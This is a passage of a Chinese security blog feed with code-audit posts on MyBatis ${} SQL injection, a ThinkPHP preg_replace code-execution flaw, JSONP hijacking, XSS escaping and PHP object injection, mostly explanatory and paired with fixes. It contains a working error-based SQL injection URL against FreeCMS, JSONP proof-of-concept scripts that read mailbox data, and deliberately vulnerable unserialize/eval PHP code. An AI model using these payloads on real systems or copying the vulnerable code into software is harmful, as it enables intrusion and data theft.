</code></pre><p>这个语句被称作 selectPerson，接受一个 int（或 Integer）类型的参数，并返回一个 HashMap类型的对象，其中的键是列名，值便是结果行中的对应值。</p>
<p>注意参数符号：</p>
<pre><code>#{<span class="ruby">id}</span>
</code></pre><p>这就告诉 MyBatis 创建一个预处理语句参数，通过 JDBC，这样的一个参数在 SQL中会由一个“?”来标识，并被传递到一个新的预处理语句中，就像这样：</p>
<pre><code>// Similar JDBC <span class="preprocessor">code</span>, NOT MyBatis…
<span class="keyword">String </span><span class="keyword">selectPerson </span>= <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span><span class="comment">;</span>
<span class="label">PreparedStatement</span> ps = conn.prepareStatement(<span class="keyword">selectPerson);
</span><span class="label">ps.setInt</span>(<span class="number">1</span>,id)<span class="comment">;</span>
</code></pre><p>使用<code>#</code>mybatis会使用预编译来处理参数，这样子可以避免SQL注入。</p>
<p>但是使用<code>$</code>描述参数会直接把变量拼接到SQL语句中，不做任何处理。相当于直接字符串拼接SQL。这样的方式就可能存在SQL注入。下面的描述来自mybatis官方文档。</p>
<pre><code>默认情况下,使用#{}格式的语法会导致 MyBatis 创建预处理语句属性并安全地设置值（比如?）。这样做更安全，更迅速，通常也是首选做法，不过有时你只是想直接在 SQL 语句中插入一个不改变的字符串。比如，像 <span class="keyword">ORDER</span> <span class="keyword">BY</span>，你可以这样来使用：

<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="label">${columnName}</span>
这里 MyBatis 不会修改或转义字符串。

<span class="keyword">NOTE</span> 以这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的 SQL 注入攻击，因此要么不允许用户输入这些字段，要么自行转义并检验。
</code></pre><h1 id="demo演示">demo演示</h1><p>使用<a href="http://www.cnblogs.com/zhanjindong/p/3397828.html" target="_blank" rel="external">MyBatis使用示例</a>作为demo测试。</p>
<p>mapper文件：</p>
<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
<span class="doctype">&lt;!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span>
<span class="tag">&lt;<span class="title">mapper</span> <span class="attribute">namespace</span>=<span class="value">"test.mybatis.UserMapper"</span>&gt;</span>
    <span class="comment">&lt;!-- 这里namespace必须是UserMapper接口的路径” --&gt;</span>
    <span class="tag">&lt;<span class="title">insert</span> <span class="attribute">id</span>=<span class="value">"insertUser"</span> <span class="attribute">parameterType</span>=<span class="value">"User"</span>&gt;</span>
        insert into user(name,age) values(#{name},#{age})
        <span class="comment">&lt;!-- 这里sql结尾不能加分号，否则报“ORA-00911”的错误 --&gt;</span>
    <span class="tag">&lt;/<span class="title">insert</span>&gt;</span>
    <span class="comment">&lt;!-- 这里的id必须和UserMapper接口中的接口方法名相同 --&gt;</span>
    <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"getUser"</span> <span class="attribute">resultType</span>=<span class="value">"User"</span>&gt;</span>
        select * from user where name=#{name}
    <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
<span class="tag">&lt;/<span class="title">mapper</span>&gt;</span>
</code></pre><p>在输入中插入单引号</p>
<pre><code><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getUser</span>(<span class="params"></span>) </span>{
    SqlSession sqlSession = sqlSessionFactory.openSession();
    <span class="keyword">try</span> {
        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);
        User user = userMapper.getUser(<span class="string">"'zhangsan"</span>);
        System.<span class="keyword">out</span>.println(<span class="string">"name: "</span> + user.getName() + <span class="string">"|age: "</span>
                + user.getAge());
    } <span class="keyword">finally</span> {
        sqlSession.close();
    }
</code></pre><p>查看执行的sql语句：</p>
<p><img src="/images/mybatis21.png" alt=""></p>
<p>可以看到输入被单引号包裹，并且对字符串中的单引号进行了转义。</p>
<p>将<code>#</code>改成<code>$</code>,mapper文件为：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"getUser"</span> resultType=<span class="string">"User"</span>&gt;
    <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> name=${_parameter}
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>这里由于代码的写法问题，name需要改成_parameter,参考<a href="http://woshixy.blog.51cto.com/5637578/1180914" target="_blank" rel="external">Mybatis中传参包There is no getter for property named XXX in class java.lang.String</a>。</p>
<p>查看执行的SQL语句：</p>
<p><img src="/images/mybatis22.png" alt=""></p>
<p>输入没有任何改变的拼接到SQL中，造成了SQL注入。</p>
<h1 id="实战分析">实战分析</h1><p>mybatis generator插件默认生成的order by 条件是使用<code>$</code>表示变量。</p>
<pre><code>...
 <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"selectByExample"</span> <span class="attribute">resultMap</span>=<span class="value">"BaseResultMap"</span> <span class="attribute">parameterType</span>=<span class="value">"com.tgwoo.ctspmt.model.MtVMsgItemExample"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectPrefix"</span> /&gt;</span>
    select
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"distinct"</span> &gt;</span>
      distinct
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Base_Column_List"</span> /&gt;</span>
    from CTSPMT.MT_V_MSG_ITEM
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"_parameter != null"</span> &gt;</span>
      <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Example_Where_Clause"</span> /&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"orderByClause != null"</span> &gt;</span>
      order by ${orderByClause}
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectSuffix"</span> /&gt;</span>
  <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
...
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectPrefix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      select * from ( select row_.*, rownum rownum_ from ( 
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectSuffix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      <span class="cdata">&lt;![CDATA[ ) row_ ) where rownum_ &gt; #{page.begin} and rownum_ &lt;= #{page.end} ]]&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
...
</code></pre><p>所以使用mybatis generator插件生成的代码中，需要自己过滤order by参数，如果用户可控就会导致SQL注入。而大部分情况下，开发者可能没有意识到这个问题。</p>
<p>以freecms为例。<a href="http://www.freeteam.cn/" target="_blank" rel="external">Freecms</a>是一款开源javacms。最新版下载<a href="http://www.freeteam.cn/freecms1.5.rar" target="_blank" rel="external">地址</a>。freecms中的orderby都是使用的<code>$</code>描述变量。</p>
<p><img src="/images/mybatis23.png" alt=""></p>
<p>前面的分析可以知道，这种情况，mybatis会直接拼接字符串到SQL中不做任何处理。</p>
<p>注册用户登录访问：</p>
<pre><code>http://192.168.99.100:8080/freecms/member/creditlog_list.do?order=extractvalue(1,concat(0x7C,(select%20user()),0x7C))
</code></pre><p><img src="/images/mybatis24.png" alt=""></p>
<p>查看执行的SQL为：</p>
<p><img src="/images/mybatis25.png" alt=""></p>
<h1 id="修复方案">修复方案</h1><p>尽量使用<code>#</code>描述参数，如果一定要使用<code>$</code>，则需要自己过滤用户输入。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持]]>
    </summary>
    
      <category term="java" scheme="http://xdxd.love/tags/java/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[thinkphp URL命令执行漏洞分析]]></title>
    <link href="http://xdxd.love/2016/03/11/thinkphp-URL%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/03/11/thinkphp-URL命令执行漏洞分析/</id>
    <published>2016-03-11T07:14:03.000Z</published>
    <updated>2016-03-11T08:06:17.000Z</updated>
    <content type="html"><![CDATA[<p>漏洞很老了。整理一下。<a href="http://www.thinkphp.cn/info/55.html" target="_blank" rel="external">补丁地址</a></p>
<p>代码修复的方式为：</p>
<pre><code>/trunk/ThinkPHP/Lib/Core/Dispatcher.class.php 
<span class="number">125</span>  -   <span class="variable">$res</span> = preg_replace(<span class="string">'@(w+)'</span>.<span class="variable">$depr</span>.<span class="string">'([^'</span>.<span class="variable">$depr</span>.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'</span>\\<span class="number">1</span>\<span class="string">']="\\2";'</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>)); 
<span class="number">125</span>  +   <span class="variable">$res</span> = preg_replace(<span class="string">'@(w+)'</span>.<span class="variable">$depr</span>.<span class="string">'([^'</span>.<span class="variable">$depr</span>.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'</span>\\<span class="number">1</span>\<span class="string">']=\'</span>\\<span class="number">2</span>\<span class="string">';'</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>)); 
</code></pre><p>这里导致代码执行的原因有两个，一是preg_replace使用了e修饰符，这样<code>$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;</code> 会被当做php代码执行。而双引号的变量会被解析，导致了代码执行。</p>
<p>关键代码为：</p>
<pre><code><span class="variable">$depr</span> = C(<span class="string">'URL_PATHINFO_DEPR'</span>);
        // 分析PATHINFO信息
        self::getPathInfo();
        <span class="keyword">if</span>(!self::routerCheck()){   // 检测路由规则 如果没有则按默认规则调度URL
            <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim($_SERVER[<span class="string">'PATH_INFO'</span>],<span class="string">'/'</span>));
            <span class="variable">$var</span>  =  array();
            if (C(<span class="string">'APP_GROUP_LIST'</span>) &amp;&amp; !isset($_GET[C(<span class="string">'VAR_GROUP'</span>)])){
                <span class="variable">$var</span>[C(<span class="string">'VAR_GROUP'</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">','</span>,strtolower(C(<span class="string">'APP_GROUP_LIST'</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">''</span>;
                if(C(<span class="string">'APP_GROUP_DENY'</span>) &amp;&amp; in_array(strtolower(<span class="variable">$var</span>[C(<span class="string">'VAR_GROUP'</span>)]),explode(<span class="string">','</span>,strtolower(C(<span class="string">'APP_GROUP_DENY'</span>))))) {
                    // 禁止直接访问分组
                    exit;
                }
            }
            if(!isset($_GET[C(<span class="string">'VAR_MODULE'</span>)])) {// 还没有定义模块名称
                <span class="variable">$var</span>[C(<span class="string">'VAR_MODULE'</span>)]  =   array_shift(<span class="variable">$paths</span>);
            }
            <span class="variable">$var</span>[C(<span class="string">'VAR_ACTION'</span>)]  =   array_shift(<span class="variable">$paths</span>);
            // 解析剩余的URL参数
            <span class="variable">$res</span> = preg_replace(<span class="string">'@(\w+)'</span>.<span class="variable">$depr</span>.<span class="string">'([^'</span>.<span class="variable">$depr</span>.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'</span>\\<span class="number">1</span>\<span class="string">']=strip_tags(\'</span>\\<span class="number">2</span>\<span class="string">');'</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));
            $_GET   =  array_merge(<span class="variable">$var</span>,$_GET);
        }
</code></pre><h1 id="反思">反思</h1><p>深入理解漏洞原型，理清复杂逻辑</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://www.zzxiaoyu.cn/?post=63" target="_blank" rel="external">Thinkphp 3.0-3.1版代码执行</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>漏洞很老了。整理一下。<a href="http://www.thinkphp.cn/info/55.html" target="_blank" rel="external">补丁地址</a></p>
<p>代码修复的方式为：</p>
<pre><code>/trunk/T]]>
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[referer安全技术攻防]]></title>
    <link href="http://xdxd.love/2016/03/10/referer%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%94%BB%E9%98%B2/"/>
    <id>http://xdxd.love/2016/03/10/referer安全技术攻防/</id>
    <published>2016-03-10T07:09:02.000Z</published>
    <updated>2016-03-10T07:09:02.000Z</updated>
    <content type="html"></content>
    <summary type="html">
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[jsonp漏洞分析]]></title>
    <link href="http://xdxd.love/2016/03/10/jsonp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/03/10/jsonp漏洞分析/</id>
    <published>2016-03-10T02:46:53.000Z</published>
    <updated>2016-03-10T07:06:32.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>json(javascript object notation)是javascript对象表示法的意思。</p>
<p>比如：</p>
<pre><code>var impromptu_object = {
    <span class="string">"given_name"</span> : <span class="string">"john"</span>,
    <span class="string">"family_name"</span>: <span class="string">"smith"</span>,
    <span class="string">"lucky_numbers"</span>: [<span class="number">11630</span>,<span class="number">12067</span>,<span class="number">12407</span>,<span class="number">12887</span>]
};
alert(impromptu_object.given_name);
</code></pre><p>运行结果是弹出john。</p>
<p>jsonp字面上的含义是”填充式(padding)的JSON”,它通过填充二外的内容吧JSON序列化包装起来，变成一段有效的可以独立运行的Javascript语句。常见的例子包括函数调用(例如callback_function({…JSON data…}))或变量赋值(var return_value = {…JSON data…})</p>
<h1 id="利用方式">利用方式</h1><p>返回值形式为：变量赋值的形式</p>
<pre><code>Qmail.newMailsList={total:446,mailHome:"http://mail.qq.com/cgi-bin/login?f...


<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">  
<span class="keyword">var</span> Qmail={};   先定义变量
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://mail.qq.com/cgi-bin/login?fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">  
alert(Qmail.newMailsList.nextUrl);  
alert(<span class="built_in">document</span>.scripts[<span class="number">1</span>].src=Qmail.newMailsList.nextUrl);  
alert(Qmail.newMailsList.summary);  
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
</code></pre><p>返回值形式为函数调用</p>
<pre><code><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">  
<span class="function"><span class="keyword">function</span> <span class="title">wooyun_callback</span><span class="params">(a)</span></span>{  
alert(a);  
}  
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://www.wooyun.org/userdata.php?callback=wooyun_callback"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
</code></pre><h1 id="防御方案">防御方案</h1><p>1，对于同域的json使用情况下，可以在数据的输出头部加入while(1);的方式避免数据被script标签的方式引用，这可以防止一些比较有特性的浏览器里导致的数据泄漏。腾讯的一个案例加了”-1”</p>
<pre><code><span class="comment">//Ignoring The First Item "-1"Qmail.newMailsList={total:</span>
</code></pre><p>2,referer的来源限制，利用前端referer的不可伪造性来保障请求数据的应用来源于可信的地方，此种方式力度较稀，完全依赖于referer，某些情况下（如存在xss）可能导致被绕过。</p>
<p>3,token的加入，严格来说，这种利用javascript hijacking的方式获取数据是CSRF的一种，不过较之传统的CSRF不能获取数据只能提交而言，这种方式利用javascript可以获取一些敏感信息而已。如果我们能让攻击者对接口未知，就可以实现json hijacking的防御了。利用token对调用者的身份进行认证，这种方式对于调用者的身份会要求力度较细，但是一旦出现xss也可能导致前端Token的泄露，从而导致保护失效。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="external">知道创宇  JSONP 安全攻防技术</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>json(javascript object notation)是javascript对象表示法的意思。</p>
<p>比如：</p>
<pre><code>var impromptu_object = {
    <span ]]>
    </summary>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用转义防御XSS]]></title>
    <link href="http://xdxd.love/2016/03/09/%E4%BD%BF%E7%94%A8%E8%BD%AC%E4%B9%89%E9%98%B2%E5%BE%A1XSS/"/>
    <id>http://xdxd.love/2016/03/09/使用转义防御XSS/</id>
    <published>2016-03-09T07:53:57.000Z</published>
    <updated>2016-03-09T08:26:02.000Z</updated>
    <content type="html"><![CDATA[<p>在输出的时候防御XSS即对用户输入进行转义，XSS的问题本质上还是代码注入，HTML或者javascript的代码注入，即混淆了用户输入的数据和代码。而解决这个问题，就需要根据用户可控数据具体输出的环境进行恰当的转义。</p>
<h1 id="在html标签中输出">在html标签中输出</h1><pre><code><span class="tag">&lt;<span class="title">HTML标签</span>&gt;</span>[输出]<span class="tag">&lt;/<span class="title">HTML标签</span>&gt;</span>
</code></pre><p>只需要htmlencode即可。更具体是转义掉&lt; &gt; 就可以防止html注入。</p>
<h1 id="输出在普通html属性中">输出在普通html属性中</h1><pre><code><span class="tag">&lt;<span class="title">div</span> <span class="attribute">attr</span>=<span class="value">不可信数据</span>&gt;</span>content<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
</code></pre><p>好的方案应该是把不可信数据用双引号包裹起来，然后对数据进行htmlencode。</p>
<h1 id="在script标签中输出">在script标签中输出</h1><pre><code><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript"><span class="keyword">var</span> $a=<span class="string">"不可信数据"</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</code></pre><p>确保输出变量在引号中，使用javascript编码输入数据。要防止<code>&lt;/script&gt;</code> 截断</p>
<h1 id="输出在on事件中">输出在on事件中</h1><pre><code><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">#</span> <span class="attribute">onlick</span>=<span class="value">"funcA('$var')"</span>&gt;</span> test<span class="tag">&lt;/<span class="title">a</span>&gt;</span>
</code></pre><p>防御：先做javascript编码，再做html编码。因为输出数据位于html标签属性中，浏览器会进行html自解码。</p>
<h1 id="在地址中输出">在地址中输出</h1><p>对协议进行白名单，http或者https，然后对其他部门进行url编码。避免javascript，data uri等伪协议攻击。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在输出的时候防御XSS即对用户输入进行转义，XSS的问题本质上还是代码注入，HTML或者javascript的代码注入，即混淆了用户输入的数据和代码。而解决这个问题，就需要根据用户可控数据具体输出的环境进行恰当的转义。</p>
<h1 id="在html标签中输出">在ht]]>
    </summary>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[php对象注入漏洞]]></title>
    <link href="http://xdxd.love/2016/03/08/php%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://xdxd.love/2016/03/08/php对象注入漏洞/</id>
    <published>2016-03-08T10:29:59.000Z</published>
    <updated>2016-03-09T03:29:24.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>理解php对象注入,需要了解基本的php面向对象编程的概念和php中的魔术方法。可以参考<a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">理解php对象注入</a>,文中练习代码可以在<a href="https://github.com/stayliv3/blog_material/tree/master/objecti" target="_blank" rel="external">这里下载</a></p>
<p>用户可控的数据进入了unserialize函数进行对象重建，通常通过(但不限于)魔术方法进行利用</p>
<h1 id="利用方式">利用方式</h1><h1 id="修复方案">修复方案</h1><p>避免用户可控的输入进入unserialize函数</p>
<h1 id="漏洞代码">漏洞代码</h1><p>php</p>
<pre><code>class RunCode
{
   public <span class="variable">$code</span>;
   function __construct()
   {

   }
   function __wakeup()
   {
        if(isset(<span class="variable">$this-</span>&gt;code))
        {
            eval(<span class="variable">$this-</span>&gt;code);
        }
   }
}
<span class="keyword">if</span>(isset($_REQUEST[<span class="string">'array'</span>]))
{   
 <span class="variable">$var1</span>=unserialize($_REQUEST[<span class="string">'array'</span>]);
if(is_array(<span class="variable">$var1</span>))
{
echo <span class="string">"&lt;br/&gt;First Element: "</span>.<span class="variable">$var1</span>[<span class="number">0</span>];
}
}
<span class="keyword">else</span>
{
echo <span class="string">"Array parameter is missing"</span>;
}
 ?&gt;
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>理解php对象注入,需要了解基本的php面向对象编程的概念和php中的魔术方法。可以参考<a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="ext]]>
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
